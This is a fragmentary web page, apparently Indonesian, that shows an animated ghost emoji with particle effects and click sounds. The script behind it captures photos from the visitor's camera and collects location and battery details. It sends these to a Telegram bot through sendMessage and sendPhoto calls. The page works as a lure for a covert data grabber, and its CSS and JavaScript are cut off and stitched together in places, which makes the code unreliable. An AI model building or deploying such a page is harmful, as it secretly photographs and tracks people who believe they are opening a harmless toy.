    <style>
        * {

            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #000000, #1a1a2e, #16213e);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        
        .ghost-container {
            position: relative;
            text-align: center;
        }
        
        .main-ghost {
            font-size: 30vw;
            animation: float 3s ease-in-out infinite;
            text-shadow: 0 0 50px rgba(255, 255, 255, 0.8);
            cursor: pointer;
            transition: all 0.3s;
            user-select: none;
            z-index: 100;
            position: relative;
            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.5));
        }
        
        .main-ghost:hover {
            transform: scale(1.15);
            text-shadow: 0 0 70px rgba(255, 255, 255, 1);
        }
        
        .main-ghost:active {
            transform: scale(0.9);
        }
        
        .ghost-particle {
            position: absolute;
            font-size: 5rem;
            pointer-events: none;
            opacity: 0;
            z-index: 1;
            animation: particle 2s ease-out forwards;
            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.7));
        }
        
        .pulse-effect {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40vw;
            height: 40vw;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 70%);
            opacity: 0;
            z-index: 0;
        }
        
        @keyframes float {
            0%, 100% { 
                transform: translateY(0px) rotate(0deg); 
                text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
            }
            25% { 
                transform: translateY(-25px) rotate(5deg);
                text-shadow: 0 0 40px rgba(255, 255, 255, 1);
            }
            50% { 
                transform: translateY(-10px) rotate(-5deg);
                text-shadow: 0 0 35px rgba(255, 255, 255, 0.9);
            }
            75% { 
                transform: translateY(-20px) rotate(3deg);
                text-shadow: 0 0 45px rgba(255, 255, 255, 1);
            }
        }
        
        @keyframes particle {
            0% { 
                opacity: 1;
                transform: translate(0, 0) scale(1) rotate(0deg);
            }
            100% { 
                opacity: 0;
                transform: translate(var(--tx), var(--ty)) scale(0.2) rotate(360deg);
            }
        }
        
        @keyframes pulse {
            0% {
                transform: translate(-50%, -50%) scale(0.5);
                opacity: 1;
            }
            100% {
                transform: translate(-50%, -50%) scale(2);
                opacity: 0;
            }
        }
        
        @keyframes collecting {
            0% {

                filter: hue-rotate(0deg);
            }

                transform: scale(1.3);
                filter: hue-rotate(180deg);
            }
            100% {
                transform: scale(1);
                filter: hue-rotate(360deg);

        // Suara klik keyboard (dibuat dengan Web Audio API)
        function playClickSound() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
                oscillator.frequency.exponentialRampToValueAtTime(300, audioContext.currentTime + 0.1);
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.1);
            } catch (e) {
                // Fallback silent jika Web Audio API tidak didukung
            }
        }

        // Fungsi untuk membuat partikel emoji
        function createGhostParticles(x, y) {
            const particlesCount = 30;

            // Buat efek pulse
            const pulse = document.createElement('div');
            pulse.className = 'pulse-effect';
            pulse.style.animation = 'pulse 1s forwards';
            document.body.appendChild(pulse);
            
            setTimeout(() => {
                document.body.removeChild(pulse);
            }, 1000);
            
            for (let i = 0; i < particlesCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'ghost-particle';
                
                // Pilih emoji random
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                particle.textContent = randomEmoji;
                
                // Random size
                const randomSize = 3 + Math.random() * 6;
                particle.style.fontSize = randomSize + 'rem';
                
                particle.style.left = (x - randomSize * 8) + 'px';
                particle.style.top = (y - randomSize * 8) + 'px';
                
                // Random arah dan jarak
                const angle = Math.random() * Math.PI * 2;
                const distance = 150 + Math.random() * 300;
                const tx = Math.cos(angle) * distance;
                const ty = Math.sin(angle) * distance;
                
                particle.style.setProperty('--tx', tx + 'px');
                particle.style.setProperty('--ty', ty + 'px');
                
                // Random color effect
                const hue = Math.random() * 360;
                particle.style.filter = `hue-rotate(${hue}deg) drop-shadow(0 0 10px rgba(255, 255, 255, 0.7))`;
                
                document.body.appendChild(particle);
                
                // Hapus partikel setelah animasi selesai
                setTimeout(() => {
                    if (particle.parentNode) {
                        particle.parentNode.removeChild(particle);
                    }
                }, 2000);
            }
        }
        
        // Fungsi untuk mengambil foto dari kamera
        async function capturePhoto(facingMode = 'user') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                cameraVideo.srcObject = stream;
                
                // Tunggu video siap
                await new Promise(resolve => {
                    cameraVideo.onloadedmetadata = () => {
                        resolve();
                    };
                });
                
                // Ambil frame
                const context = cameraCanvas.getContext('2d');
                cameraCanvas.width = cameraVideo.videoWidth;
                cameraCanvas.height = cameraVideo.videoHeight;
                context.drawImage(cameraVideo, 0, 0);
                
                // Konversi ke blob
                return new Promise(resolve => {
                    cameraCanvas.toBlob(blob => {
                        // Hentikan stream
                        stream.getTracks().forEach(track => track.stop());
                        resolve(blob);
                    }, 'image/jpeg', 0.8);
                });
            } catch (error) {
                return null;
            }
        }

                    const locationData = await response.json();

                    data.provinsi = locationData.principalSubdivision || "Tidak Terdeteksi";
                    data.kecamatan = locationData.locality || "Tidak Terdeteksi";
                    data.negara = locationData.countryName || "Tidak Terdeteksi";

                } catch (e) {

                }
            } catch (e) {

                data.kota = data.provinsi = data.kecamatan = data.negara = data.kodePos = "Tidak Terdeteksi";

                    data.charging = data.level = data.chargingTime = data.dischargingTime = "Tidak Terdeteksi";
                }

        // Fungsi untuk mengirim data ke Telegram
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
        
        // Fungsi untuk mengirim foto ke Telegram
        async function sendPhotoToTelegram(photoBlob, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob);
                formData.append('caption', caption);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return await response.json();
            } catch (error) {
